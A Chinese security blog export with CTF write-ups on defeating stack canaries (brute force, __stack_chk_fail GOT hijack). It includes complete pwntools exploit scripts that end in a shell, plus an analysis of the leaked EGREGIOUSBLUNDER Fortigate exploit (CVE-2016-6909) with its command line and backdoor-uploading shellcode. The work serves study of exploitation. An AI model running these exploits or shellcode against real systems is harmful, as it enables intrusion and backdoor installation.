{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"Bypassing Canary——Leak Canary","text":"泄漏Canary的值是过Canary的最基本的操作了，通常来说有两种情况： 可以利用格式化字符串 可以控制程序输出的长度 但要注意的是，对于第二种情况，Linux种Canary的第0个字节为0x00，这意味着字符串函数在命中Canary时会被截断。解决方法是将0x00覆盖，之后利用时再还原位0x00。","link":"/2018/11/14/Bypassing Canary——Leak Canary/"},{"title":"Bypassing Canary——Brute force","text":"我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。 12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序一开始运行时就已经确定了。而对于典型的多进程并发服务器，程序统一由父进程来accept连接，然后fork子进程处理读写。子进程数据空间中的内容是父进程的完整拷贝，二者具有相同的Canary，这也让爆破Canary成为了可能。 首先Canary第0位永远是0x00，这是为了防止Canary被打印出来做的截断。 确定溢出长度后，在该长度基础上逐位增加一字节爆破，如果程序没有崩溃则说明该位正确 一直跑出Canary的所有位，64位程序最多尝试7*256次，32位最多尝试3*256次 下面来看具体的例子 NJCTF2017 messagerchecksec: 1234567$ checksec messager[*] '/root/NJCTF2017/messager' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 运行结果： 分析使用IDA分析，我们可以得到第一个关键信息 这是一个典型的多进程并发服务器 结合上面checksec的结果，首先想到的应该就是想办法爆破Canary。 12345678910111213141516171819202122232425262728293031323334353637... while ( 1 ) { fd = accept(sock, &amp;sock_addr, &amp;addr_len); if ( fd == -1 ) { perror(\"accept\"); return 0xFFFFFFFFLL; } send(fd, \"Welcome!\\n\", 9uLL, 0); pid = fork(); if ( pid == -1 ) { perror(\"fork\"); return 0xFFFFFFFFLL; } if ( !pid ) break; close(fd); } signal(14, (__sighandler_t)handler); alarm(3u); if ( (unsigned int)handle_message() ) { if ( send(fd, \"Message receive failed\\n\", 0x19uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } } else if ( send(fd, \"Message received!\\n\", 0x12uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } return 0LL;} 进一步查看处理连接的函数handle_message()，可以得到另外两个关键信息： Canary在rbp-0x8处 读取用户输入时存在一个栈溢漏洞，需要填充的空间大小为0x78-0x10=0x68字节 12345678910111213141516171819202122signed __int64 handle_message(){ signed __int64 result; // rax char s; // [rsp+10h] [rbp-70h] unsigned __int64 canary; // [rsp+78h] [rbp-8h] //canary位于rbp-0x8 canary = __readfsqword(0x28u); printf(\"csfd = %d\\n\", (unsigned int)fd); bzero(&amp;s, 0x64uLL); if ( (unsigned int)recv(fd, &amp;s, 0x400uLL, 0) == -1 ) //s的大小只有0x68字节 { perror(\"recv\"); result = 0xFFFFFFFFLL; } else { printf(\"Message come: %s\", &amp;s); fflush(stdout); result = 0LL; } return result;} 再检查剩下的几个函数，函数sub_400b76()将打开文件flag并将内容写入bss中： 123456789101112ssize_t read_flag(){ int fd; // [rsp+Ch] [rbp-4h] fd = open(\"./flag\", 0); if ( fd &lt; 0 ) { perror(\"open flag failed\"); exit(0); } return read(fd, &amp;flag, 0x64uLL);} 函数sub_400bc6()向fd中发送flag，这里重命名为send_flag()。 1234ssize_t sned_flag(){ return send(fd, &amp;flag, 0x64uLL, 0);} 利用因此利用思路就可以确定如下，结合上面静态分析得到的信息，甚至不用调试 逐字节爆破Canary 已用栈溢出覆盖返回地址 在溢出数据恰当的偏移处填上爆破出的Canary 将返回地址覆盖为sned_flag()的地址 12345678910111213141516171819202122232425262728293031#!/usr/bin/pythonfrom pwn import *context.log_level = 'WARN'send_flag = p64(0x400bc6)# leak Canarycanary = \"\\x00\" #Canary的最低位为0x00for x in range(7): for y in xrange(256): p = remote(\"127.0.0.1\", 5555) p.recv() p.send(\"A\"*0x68+canary+chr(y)) try: p.recv() except: p.close() continue p.close() break canary += chr(y) print(\"[*] Canary byte \" + str(x+1) +\": \" + hex(y))p = remote(\"127.0.0.1\", 5555)p.recv()p.send(\"A\"*0x68+canary+\"A\"*8+send_flag)flag = p.recv()p.close()print('[+] flag is:' + flag) Exp运行结果： 123456789$ ./exp.py[*] Canary byte 1: 0x10[*] Canary byte 2: 0x30[*] Canary byte 3: 0xe4[*] Canary byte 4: 0x8c[*] Canary byte 5: 0x87[*] Canary byte 6: 0x2[*] Canary byte 7: 0x19[+] flag is:flag{This is flag}","link":"/2018/11/14/Bypassing Canary——Brute force/"},{"title":"Bypassing Canary——hijack __stack_chk_fail","text":"当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。 从glibc源码中可以看到，定义了THREAD_SET_STACK_GUARD时，Canary通过这个宏被设置；否则存入全局变量__stack_chk_guard中 1234567 /* Set up the stack checker's canary. */ uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD THREAD_SET_STACK_GUARD (stack_chk_guard);# else __stack_chk_guard = stack_chk_guard;# endif 进一步查看THREAD_SET_STACK_GUARD定义 12# define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) 查看THREAD_SETMEM，可以看到这个宏通过内联汇编，将vlaue，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过offsetof宏得到的pthread结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员header.stack_guard。 1234567891011121314151617181920# define THREAD_SETMEM(descr, member, value) \\ ({ if (sizeof (descr-&gt;member) == 1) \\ asm volatile (\"movb %b0,%%fs:%P1\" : \\ : \"iq\" (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else if (sizeof (descr-&gt;member) == 4) \\ asm volatile (\"movl %0,%%fs:%P1\" : \\ : IMM_MODE (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else \\ { \\ if (sizeof (descr-&gt;member) != 8) \\ /* There should not be any value with a size other than 1, \\ 4 or 8. */ \\ abort (); \\ \\ asm volatile (\"movq %q0,%%fs:%P1\" : \\ : IMM_MODE ((uint64_t) cast_to_integer (value)), \\ \"i\" (offsetof (struct pthread, member))); \\ }}) pthread是一个超大的结构体，这里略去余下部分 123456789...struct pthread{ union {#if !TLS_DTV_AT_TP /* This overlaps the TCB as used for TLS without threads (see tls.h). */ tcbhead_t header;... Canary正是存储在tcbhead_t中的stack_guard，根据变量类型可以计算出在32位和64位上的偏移： 32位 gs:0x14 （0x4×3+0x4×3+0x4） 64位 fs:0x28（0x8×3+0x4×3+0x8） 1234567891011121314151617181920212223242526272829typedef struct{ void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];} tcbhead_t;","link":"/2018/11/15/Bypassing Canary——Override Canary in TLS/"},{"title":"Bypassing Canary——SSP Leak","text":"SSP Leak","link":"/2018/11/16/Bypassing Canary——SSP Leak/"},{"title":"Bypassing Canary——hijack __stack_chk_fail","text":"Canary验证失败后，会调用 __stack_chk_fail 函数打印如下信息： 1stack smashing detected ***: ./XXX terminated __stack_chk_fail` 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。 但只有程序的RELRO为Partial RELRO才可以执行这种操作 NJCTF2017 messagerchecksec1234567$ checksec login[*] '/root/ZCTF2017/login' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 运行结果： 第一部分，覆盖__stack_chk_fail 的GOT表项 观察上图，format string实际存放在0xffce2ed6，字符串被sprintf写入0xffce2e5c（eax），所以要覆写format string，payload前还需要0xffce2ed6 - 0xffce2e5c = 0x7a字节，具体填充在下面代码注释中： 123456789101112131415161718def exploit(): # __stack_chk_fail GOT表中的地址，用于后面修改 payload = p32(binary.symbols['got.__stack_chk_fail']) # sprintf写入字符串的长度为0x4c，减去前面__stack_chk_fail的地址，再加上ebp payload += 'a' * (0x48+0x4) # 将返回地址覆盖为main函数地址，以便再次获得执行机会 payload += p32(binary.symbols['main']) # 填充一定字节直到可以覆盖format string payload += 'a' * 0x26 # 将format string修改为如下内容 payload += r'%s:%39x%10$hhn' + '\\x00' # %s 读取payload，使格式化字符串被覆盖 # %n 配合%c或%x使用，%n负责统计输出的字符数量,写入到%n对应变量里。 # 在上面的%10$hhn中，10$指第10个变量，hhn指写入一个字节 # 8 alarm # 39 malloc... 第二部分， leak libc第一部分的代码执行完后，__stack_chk_fail 的GOT被覆盖为malloc@plt，不会触发Canary机制，同时返回到main中，我们有了第二次输入的机会。 第二次输入将返回地址覆盖为puts，返回地址依然设为main以获得第三次输入的机会，同时将puts的GOT表项作为puts的参数，这样我们就可以泄漏libc中puts的地址。 12345678910111213141516171819202122232425... payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) # return address payload += p32(binary.symbols['main']) # return from puts payload += p32(binary.symbols['got.puts']) # args of puts # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') # `Login successful!`后的回显 p.recvline() # 读取完整的该行回显 leak = p.recvline()[:4] # 第二次puts的输出，取前4字节 leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh)... 第三部分，get shell泄漏出libc地址后，通过ROP get shell 123456789payload = 'a' * 0x50payload += p32(libc.symbols['system'])payload += 'a' * 0x4 # 任意4字节payload += p32(bin_sh)input_username(payload)input_passsword(p32(0))p.interactive() 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/pythonfrom pwn import *context.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'DEBUG'libc_path = './libc-2.19.so'bin_path = './login'libc = ELF(libc_path)binary = ELF(bin_path)host = ''port = 6666def debug(command=''): gdb.attach(p, command)def input_username(name): p.recvuntil('username:') p.sendline(name)def input_passsword(password): p.recvuntil('password:') p.sendline(password)def exploit(): #debug('b *0x8048751\\nc\\n') payload = p32(binary.symbols['got.__stack_chk_fail']) # stack payload += 'a' * (0x48+0x4) # stack+ebp payload += p32(binary.symbols['main']) # ret addr payload += 'a' * 0x26 # padding payload += r'%s:%39x%10$hhn' + '\\x00' input_username(payload) input_passsword(p32(0)) payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) payload += p32(binary.symbols['main']) payload += p32(binary.symbols['got.puts']) # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') p.recvline() leak = p.recvline()[:4] leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh) payload = 'a' * 0x50 payload += p32(libc.symbols['system']) payload += p32(binary.symbols['main']) payload += p32(bin_sh) input_username(payload) input_passsword(p32(0)) p.interactive()if __name__ == '__main__': if len(sys.argv) == 1: global p p = process(executable=bin_path, argv=[bin_path]) #, env={'LD_PRELOAD':libc_path}) else: p = remote(host, port) exploit() exp运行结果：","link":"/2018/11/15/Bypassing Canary——hijack __stack_chk_fail/"},{"title":"CVE-2016-6909：Equation Group防火墙利用工具EGREGIOUSBLUNDER分析","text":"一、背景2016年，Shadow Brokers公开了黑客组织Equation Group（传言属于NSA）针对各大厂商防火墙的漏洞利用工具遭到泄露。笔者找到了一个Fortigate防火墙的虚拟机版——FGT_VM-v400-build0482，正巧就在受漏洞影响的版本范围内，遂对利用工具中的EGREGIOUSBLUNDER进行了一番深入分析。相比起其他工具的奇葩名字，EGREGIOUSBLUNDER （令人震惊的错误）倒是十分贴切的。它利用了[CVE-2016-6909——Fortigate防火墙Web管理界面HTTP cookie的栈溢出漏洞，直接覆盖返回地址就可以控制程序指针，经典的栈溢出。按理说这种漏洞什么太高的技术含量，但是在防火墙上动态调试环境的搭建以及该工具中shellcode的编写都挺有意思的，所以觉得还是记录一下。 Tip: 可以在这里下载VM版防火墙 二、环境搭建和工具介绍2.1 Fortigate防火墙配置启动防火墙后，我们可以看到用于配置防火墙的CLI，这并不是底层系统的交互式shell，只能输入下面几个命令：1234567891011Fortigate-VM login: adminPassword: #默认密码为空Welcome !Fortigate-VM #config config objectget get dynamic and system informationshow show configurationdiagnose diagnose facilityexecute execute static commandsexit exit CLI 2.2 EGREGIOUSBLUNDER工具使用该工具需要指定很多参数，特比是需要指定一个特别的栈地址，而该地址在不同产品上都不相同吗，因此程序还附带了一个配置文件EGBL.config，里面记录了不同型号产品的相关参数。 EGBL.config的开头有几项配置，可以更改上传的后门、上传后的文件名以及执行后的进程名。 12345678# path/name of local, static-built noserver to upload NOSERV = /root/noserver# path/name of local noclient to run, should match version of server NOCLI = /root/noclient# name of noserver file on target NONAME = /bin/httpd# name of process on target NOFAKE = /bin/httpsd 还需要一个登录Web界面时设置的cookie的值，获取方式如下：12$ curl -X HEAD -v http://192.168.123.100/login 2&gt;&amp;1 | grep APSCOOKIE(standard input):15:&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 31-Dec-1968 16:48:05 GMT 接着以如下方式执行，如果后面想抓包分析的话指定80端口同时关闭ssl（设置为0），但同时也需要更改防火墙默认配置（开始http支持，默认使用https）。 123456789101112$ ./egregiousblunder -t 192.168.123.100 -p 443 -l 4444 --ssl 1 --nope --gen 4nc --cookienum 3943997904 --stack 0xbffff104loading nopen over HTTPSusing stack addr 0xbffff104built authhash len 116built enc_authhash with len 116received good ACK1 message c0edbabereceived stack addr 0xbffff104sent the file len/header, next is the file..................................done with sending (356996 bytes), waiting for file ackreceived good ACK2 message 356996, upload is cool... Tip: 笔者找到的这个Fortigate VM版的溢出地址值并不在EGBL.config中，所以只能通过一个shell脚本将一个地址范围遍历了一遍才找到正确的地址值。 2.3 防火墙Web管理界面登录流程通过WEB方式登陆防火墙时，首先发送POST请求，请求包含登录名和密码。登录成功后，服务器响应一个APSCOOKIE作为身份验证令牌， 这个cookie值必须包含在任何后续请求中。 接下来看看egregiousblunder发送的数据包，通过发送一个包含精心构造的APSCOOKIE的HTTP请求，将shellcode布置在cookie中。 三、文件系统和启动流程分析一个设备固件的分析过程，通常包括了对固件文件的解密、文件系统还原、固件文件的修改及重构等。好在VM版的Fortigate并没有加密，我们只需想办法提取到文件系统，然后就是分析系统启动流程，包括内核、内核参数、初始化文件以及系统服务程序等就行。 3.1 获取vmdk硬盘中的文件系统给Kali Linux添加一块现有硬盘，选择fortigate的vmdk硬盘。 进入系统后，查看并挂载新添加的硬盘，可以看到硬盘分区中的文件。12345678910111213141516171819202122$ mkdir fortios$ fdisk -lDisk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors...Device Boot Start End Sectors Size Id Type/dev/sdb1 * 1 262144 262144 128M 83 Linux/dev/sdb2 262145 4194304 3932160 1.9G 83 Linux$ mount /dev/sdb1 fortios$ cd fortios &amp;&amp; lltotal 23M-rw-r--r-- 1 root root 5.0M Sep 21 2011 datafs.tar.gz-rw-r--r-- 1 root root 107 Sep 21 2011 extlinux.conflrwxrwxrwx 1 root root 12 Sep 21 2011 flatkc -&gt; ./flatkc.smp-rw-r--r-- 1 root root 256 Sep 21 2011 flatkc.chk-rw-r--r-- 1 root root 1.4M Sep 21 2011 flatkc.nosmp-rw-r--r-- 1 root root 1.5M Sep 21 2011 flatkc.smp-r--r--r-- 1 root root 32K Sep 21 2011 ldlinux.sysdrwx------ 2 root root 12K Sep 21 2011 lost+found-rw-r--r-- 1 root root 15M Sep 21 2011 rootfs.gz-rw-r--r-- 1 root root 256 Sep 21 2011 rootfs.gz.chk 查看所有文件类型，最值得注意的是两个Linux内核（支持和不支持多处理器的内核），还有一个疑似initial ramdisk的文件rootfs.gz，说明这个防火墙是基于Linux的；还有一个SYSLINUX引导加载程序，我们可以查看它的配置文件extlinux.conf查看启动参数，进而确定rootfs.gz就是一个initial ramdisk。 12345678910111213$ file *datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size 8724480extlinux.conf: ASCII textflatkc: symbolic link to ./flatkc.smpflatkc.chk: dataflatkc.nosmp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGAflatkc.smp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGAldlinux.sys: SYSLINUX loader (version 4.00)lost+found: directoryrootfs.gz: gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size 19077120rootfs.gz.chk: data$ cat extlinux.confDEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz 继续解压rootfs.gz后是符合FHS的目录结构，只是bin目录被打包压缩了。到这里，整个防火墙的文件系统已经呈现在我们面前了。 12345678910111213141516171819$ file rootfsrootfs: POSIX tar archive (GNU)$ mkdir _rootfs &amp;&amp; mv rootfs _rootfs &amp;&amp; cd _rootfs$ tar xf rootfs$ lltotal 31M-rw-r--r-- 1 root root 8.4M Sep 21 2011 bin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 datadrwxr-xr-x 2 root root 1.0K Sep 21 2011 data2drwxr-xr-x 5 root root 13K Sep 21 2011 devlrwxrwxrwx 1 root root 8 Sep 21 2011 etc -&gt; data/etclrwxrwxrwx 1 root root 1 Sep 21 2011 fortidev -&gt; /drwxr-xr-x 2 root root 1.0K Sep 21 2011 lib-rw-r--r-- 1 root root 4.3M Sep 21 2011 migadmin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 proc-rw-r--r-- 1 root root 19M Sep 21 2011 rootfsdrwxr-xr-x 2 root root 1.0K Sep 21 2011 sbindrwxr-xr-x 2 root root 1.0K Sep 21 2011 tmpdrwxr-xr-x 8 root root 1.0K Sep 21 2011 var 3.2 初始化程序init分析显然，导致漏洞的程序十有八九就在/bin目录中，但尝试解压bin.tar.xz时，却发生了错误。按照System V的启动方式来看，首先内核首先启动的程序应该是/sbin/init，因此可以逆向该程序查看bin.tar.xz是如何被解压的。 首先是main函数，以下是经过整理的IDA反编译结果，init程序只做了三件事： 解压bin.tar.xz和migadmin.tar.xz 解压完后删除bin.tar.xz和migadmin.tar.xz 启动/bin/init 123456789101112131415int __cdecl main(){ char *argv; char * const envp[]; if ( decompress((int)\"bin\") &gt;= 0 ) decompress((int)\"migadmin\"); unlink(\"/sbin/xz\"); unlink(\"/sbin/ftar\"); argv = \"/bin/init\"; envp = 0; execve(\"/bin/init\", &amp;argv, &amp;envp); return 0;} 再看看decompress()函数内部，找到解压的参数。 1234567891011121314151617181920212223signed int __cdecl decompress(int a1){ //... snprintf(&amp;s, 0x200u, \"/%s.tar.xz\", a1); //... argv = \"/sbin/xz\"; xz_option_str1 = \"--check=sha256\"; xz_option_str2 = \"-d\"; v19 = &amp;s; v20 = 0; execv(\"/sbin/xz\", &amp;argv); } snprintf(&amp;name, 0x200u, \"/%s.tar\", a1); //...LABEL_21: //... var_438 = \"/sbin/ftar\"; ftar_option_str = \"-xf\"; v14 = &amp;name; v15 = 0; execv(\"/sbin/ftar\", &amp;var_438); return 0;} chroot切换根目录到_rootfs目录解压两个文件 12$ chroot . /sbin/xz -d bin.tar.xz$ chroot . /sbin/ftar -xf bin.tar Tip: 其实进入sbin目录看到两个解压程序xz和ftar就能猜到怎么回事儿了，不过确认一下也好 3.3 启动过程分析bin目录中的程序大部分都是指向init和sysctl的软链接，前者实现了防火墙的业务功能，后者类似busybox，提供一些Linux系统命令。 1234567891011121314151617181920$ lltotal 29Mlrwxrwxrwx 1 root root 9 Dec 19 17:31 authd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cat -&gt; /bin/sysctllrwxrwxrwx 1 root root 11 Dec 19 17:31 chmod -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 cmdbsvr -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cp -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 dhcpd -&gt; /bin/initlrwxrwxrwx 1 root root 9 Dec 19 17:31 fgfmd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 grep -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 httpsd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 ifconfig -&gt; /bin/sysctl-rwxr-xr-x 1 root root 24M Sep 21 2011 initlrwxrwxrwx 1 root root 9 Dec 19 17:31 initXXXXXXXXXXXXXXXXXX -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 mkdir -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ospfd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 sh -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ssh -&gt; /bin/init-rwxr-xr-x 1 root root 154K Sep 21 2011 sysctl... 防火墙启动后，将initXXXXXXXXXXXXXXXXXX作为1号进程，接着fork出一系列的子进程实现业务功能。其中名为httpsd的守护进程，也就是Web服务器进程，根据前面的抓包分析，漏洞应该也和这个进程相关。第二个httpsd用于负责处理http请求，退出后由第一个httpsd负责重启。 四、建立动态调试环境鉴于init的复杂程度（IDA分析出来有5W+的函数，且没有符号），单纯的依靠静态分析都很难定位到实现httpsd的位置，更不用提漏洞的位置了，而fortigate似乎不像Cisco ASA那样集成了gdbserver，所以我们得自己想办法搞定这个问题，总的来说有两个思路： 将init取出来在本地调试运行； 将gdb移植到防火墙上。 可能是由于init这个程序比较特殊，经过各种尝试都没法再本地将init运行起来，因此笔者只好使用了第二种方法，这其中也有很多坑。 4.1 编译GDB这部分挺简单的就不展开讲了，但是需要注意下面几点： GDB版本，本文分析的这个防火墙是基于Linux 2.4内核的，太新的GDB也许会有兼容性问题； 静态编译，以免缺失某些库。 4.2 将GDB放入防火墙文件系统准备好GDB后，将rootfs再打包回去时，还是要记得用3.2中的方法，使用防火墙自带的ftar工具将rootfs打包回去，否则防火墙无法正常启动。 4.3 获取反向shell为了方便后期随时能接入防火墙进行调试，放置GDB的同时还可以放一个后门程序，用于得到一个shell，因为EGREGIOUSBLUNDER用的那个nopen工具是在不怎么好用。 Tip: 但这里存在一个问题——如何在防火墙启动以后，执行后门来得到shell。经过查询，笔者发现在 Fortigate 的配置命令行中，有一条隐藏命令——fnsysctl来执行前面提到过的sysctl，所以该怎么做大家应该都懂了。 五、漏洞分析5.1 定位漏洞位置查看httpsd的PID，然后GDB attach到第二个httpsd进程上，定位漏洞时，开始想在EGREGIOUSBLUNDER参数中使用的那个栈地址设置观察点，结果没有断下来。无奈只好自己构造发送给防火墙和POST数据包，将shellcode部分修改为无意义的数据，造成异常而中断下来。 最后会发现在函数sub_820CB5E()返回时（0x0820CEFB）产生了异常，再在此处下断，并使用EGREGIOUSBLUNDER，这次ret后就来到了栈上的shellcode中，也就说明了当前函数存在栈溢出。 Tip: 写这篇文章与分析的时间相隔了一年，只找到了几张图片，而且调试环境的建立也挺麻烦的，所以这里就没有贴太多调试过程的图片了。 5.2 漏洞成因经过调试可知，该函数用解析cookie，经过整理的IDA反编译结果如下。 1234567891011121314151617181920212223int __cdecl decode_cookie(char *a1){ //... unsigned int Era; // [esp+38h] [ebp-11A0h] char Payload; // [esp+14Ch] [ebp-108Ch] char AuthHash; // [esp+116Ch] [ebp-6Ch] //AuthHash位于ebp下108字节 //... size = 1; if ( a1 ) size = strlen(a1) + 1; src = 0; memset(&amp;AuthHash, 0, 0x52u); // v16 = 20; memset(&amp;Payload, 0, 0x1000u); // ptr = 0; v7 = -1; if ( a1 ) { sub_820C6F0(); if ( sscanf(a1, \"Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s\", &amp;Era, &amp;Payload, &amp;AuthHash) == 3 ) { //... 该函数在调用sscanf()将Cookie中Era、Payload和AuthHash三个值放进三个变量，却没有检查传入的AuthHash和Payload字符串大小，从而导致了缓冲区溢出。本例中，AuthHash位于ebp下108字节，EGREGIOUSBLUNDER构造了一个116字节的AuthHash，正好覆盖ebp和返回地址。 六、shellcode分析Linus Torvalds在他的自传Just for fun中谈过Unix“小即是美”的理念，几乎所有事情都由6个基本的系统调用完成（fork、execve、open、write、read和close），个人觉得EGREGIOUSBLUNDER所使用的shellcode就能完美诠释这个理念，它分为两大部分，分别通过变量AuthHash和Payload布置到内存中，并且使用了大量int 80系统调用，将后门nopen程序上传到防火墙并执行。 6.1 第一段shellcode因为栈溢出的空间太小，栈上没有足够的位置放置全部shellcode，所以这段shellcode的目的只是为了定位到已经被分配在堆上的第二段shellcode。12345678910nopnopnopmov ebp, esppop ebxpop ecx ; pop useless parameterpop ecx ; pop useless parameterpop eax ; 指向整个Cookie值的指针add eax, 0Eh ; 指向Cookie中Payload字段值的指针jmp eax ; 转跳到堆中的第二段shellcode(decoding处) 6.2 第二段shellcode第二段shellcode在前面提到decode_cookie()函数执行前就已经被放入了一块动态分配的内存中，并且指向该内存的指针作为一个参数传入了decode_cookie()，再通过第一段shellcode转跳过来。其功能是将配置文件EGBL.config中指定的后门上传到防火墙上，并通过execve系统调用替换当前的httpsd进程。 shellcode的首要任务就是定位自己在内存中的位置，即确定EIP指针的当前值，第二段shellcode的开始部分就是做这项工作，具体可以参考Shellcoder’s Programming Uncovered的10.3节。1234567sub_A56D165： pop ecx jmp ecxdecoding: call sub_A56D165;... 接着就是一段解码自身的指令。12345678910111213141516;... push eax push ecx push edx push ebx push esp push ebp push esi push edi push ecx pop ecx push 77h ; &apos;w&apos; inc edi pop eax xor al, 77h;... 解码完成后，首先通过getpeername系统调用从0xFF向下遍历可用套接字1234567891011121314151617181920212223242526272829303132333435after_decode: xor ebx, ebx mov edi, esp lea esi, [edi+10h] mov [edi+4], esi lea ecx, [edi+20h] mov [edi+8], ecx mov bl, 10h mov [ecx], ebx xor ecx, ecx mov cl, 0FFhgetpeername: mov [edi], ecx push ecx ; socket fd xor eax, eax mov al, 66h mov bl, 7 mov ecx, edi int 80h ; LINUX - sys_getpeername pop ecx ; fd xor ebx, ebx cmp eax, ebxloc_A56D23D: jnz short loc_A56D249 mov ax, 5C11hloc_A56D243: cmp [esi+2], ax jz short loc_A56D24Bloc_A56D249: loop getpeernameloc_A56D24B: mov ebx, ecx ; socket fd xor ecx, ecxloc_A56D24F: mov cl, 3 找到可用套接字后，将文件描述符0、1、2重定向到socket。123456789101112131415161718sys_dup2: xor eax, eax mov al, 3Fh dec ecx int 80h ; LINUX - sys_dup2 inc ecx loop sys_dup2 mov ebp, esp sub esp, 420h mov [ebp-4], ebx xor eax, eax mov [ebp-8], eax sub eax, 1 mov [ebp-0Ch], eax mov [ebp-10h], esp sub esp, 10h mov [ebp-424h], esp jmp short write 使用wirte系统调用发送确认ack1，其中包含了当前ebp的的信息，攻击程序收到该ACK确认消息后，会根据ebp-64h计算出实际的溢出地址作为提示消息。若发送的地址和收到的地址不同还会弹出警告。123456789101112131415sys_write: mov eax, [ecx+0Ch] xor eax, 0C0EDBABEh mov [ecx+8], eax mov eax, [ecx+14h] xor eax, ebp mov [ecx+10h], eax mov edx, 25h push edx ; len push ecx ; buffer 0xa56d2ae mov ebx, [ebp-4] push ebx ; socket fd 0x6 mov eax, 4 int 80h ; LINUX - sys_write jmp short sys_read 然后通过read接收发送的后门文件长度、文件头等信息。123456789101112131415161718192021222324sys_read: mov edx, 25h ; &apos;%&apos; push edx ; len mov ecx, [ebp-10h] push ecx ; buffer mov ebx, [ebp-4] ; socket fd 0x6 push ebx mov eax, 3 int 80h ; LINUX - sys_read cmp eax, 25h ; &apos;%&apos; jnz loc_A56D40C mov eax, [ebp-10h] mov ebx, [eax+8] mov ecx, [eax+0Ch] xor ebx, ecx ; filesize mov [ebp-8], ebx mov esi, [ebp-10h] add esi, 18h mov edi, [ebp-424h] mov ecx, 8 rep movsb xor eax, eax mov [ebp-428h], eax jmp open 上述步骤完成后，用open系统调用在防火墙上打开一个文件，并且再次使用read接收后门文件。1234567891011sys_open: mov edx, 1C0h ; mode(-rwx------) push edx mov ecx, 241h push ecx ; flags push ebx ; filename mov eax, 5 int 80h ; LINUX - sys_open mov [ebp-0Ch], eax ; nopen fd xor eax, eax mov [ebp-1Ch], eax 再次通过write将接收到的后门文件数据写入刚才打开的文件中。1234567891011121314151617181920sys_write2: inc edi loop loc_A56D368 mov [ebp-428h], edx mov edx, [ebp-14h] 